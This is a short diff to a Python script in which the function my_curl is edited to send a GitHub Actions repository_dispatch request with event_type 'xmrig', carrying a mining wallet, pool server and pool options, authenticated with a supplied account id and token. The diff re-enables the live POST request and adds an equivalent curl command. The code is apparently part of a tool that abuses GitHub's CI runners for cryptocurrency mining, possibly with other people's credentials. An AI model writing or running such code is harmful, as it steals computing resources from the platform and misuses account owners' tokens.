@@ -35,9 +35,13 @@ def my_curl(id, token):
     }
     print(headers)
     print(json.dumps(body))
-    #res = requests.post(url=url,headers=headers,data=json.dumps(body))
-    #print(res.text)
-    #return res.text;
+
+    curlstr = "curl -X POST -u \"%s:%s\" -H \"Accept: application/vnd.github.everest-preview+json\" -H \"Content-Type: application/json\" --data '{\"event_type\":\"xmrig\", \"client_payload\": {\"wallet\": \"%s\", \"sleeptime\": \"%s\", \"poolserver\": \"%s\", \"poolcmd\": \"-p %s -k\"}}' https://api.github.com/repos/%s/actions/dispatches" % (id, token, GLBWALLET, GLBSLEEPTIME, GLBHOST, id, id)
+
+    print(curlstr)
+    res = requests.post(url=url,headers=headers,data=json.dumps(body))
+    print(res.text)
+    return res.text;
 
 
 def in_pushone():
